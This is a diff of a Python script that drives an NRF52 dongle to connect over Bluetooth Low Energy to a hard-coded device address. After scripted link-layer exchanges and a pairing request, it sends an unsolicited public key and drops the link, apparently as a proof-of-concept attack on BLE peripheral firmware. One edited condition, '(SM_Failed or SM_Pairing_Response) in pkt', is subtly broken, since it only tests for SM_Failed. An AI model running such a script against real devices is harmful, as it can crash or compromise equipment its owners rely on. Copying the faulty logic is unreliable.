@@ -26,24 +26,10 @@ slave_addr_type = 0
 # Autoreset colors
 colorama.init(autoreset=True)
 
-# Get serial port from command line
 if len(sys.argv) >= 2:
-    serial_port = sys.argv[1]
-elif platform.system() == 'Linux':
-    serial_port = '/dev/ttyACM0'
-elif platform.system() == 'Windows':
-    serial_port = 'COM1'
+    advertiser_address = sys.argv[1].upper()
 else:
-    print(Fore.RED + 'Platform not identified')
-    sys.exit(0)
-
-print(Fore.YELLOW + 'Serial port: ' + serial_port)
-
-# Get advertiser_address from command line (peripheral addr)
-if len(sys.argv) >= 3:
-    advertiser_address = sys.argv[2].lower()
-else:
-    advertiser_address = '80:ea:ca:80:00:01'
+    advertiser_address = 'A4:C1:38:D8:AD:B8'
 
 print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 
@@ -65,7 +51,7 @@ def scan_timeout():
 
 
 # Open serial port of NRF52 Dongle
-driver = NRF52Dongle(serial_port, '115200')
+driver = NRF52Dongle()
 # Send scan request
 scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
     ScanA=master_address,
@@ -95,7 +81,7 @@ while True:
             print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
         # --------------- Process Link Layer Packets here ------------------------------------
         # Check if packet from advertised is received
-        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() \
+        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower() \
                 and connecting == False:
             connecting = True
             update_timeout('scan_timeout')
@@ -123,11 +109,11 @@ while True:
             connecting = False
             print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
             # Send version indication request
-            pkt = pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
+            pkt = pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_VERSION_IND(version='4.2')
             driver.send(pkt)
 
         elif LL_VERSION_IND in pkt:
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_LENGTH_REQ(
                 max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
             driver.send(pkt)
 
@@ -138,13 +124,13 @@ while True:
             driver.send(pairing_req)
         # wrpcap(os.path.basename(__file__).split('.')[0]+'.pcap', NORDIC_BLE(board=75, protocol=2, flags=0x3) / pairing_req) # save packet just sent
 
-        elif SM_Pairing_Response in pkt:
+        elif (SM_Failed or SM_Pairing_Response) in pkt:
             pairing_req = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / SM_Hdr() / SM_Public_Key()
             driver.send(pairing_req)
             end_connection = True
 
         elif LL_LENGTH_REQ in pkt:
-            length_rsp = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_RSP(
+            length_rsp = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_LENGTH_RSP(
                 max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
             driver.send(length_rsp)  # Send a normal length response
 
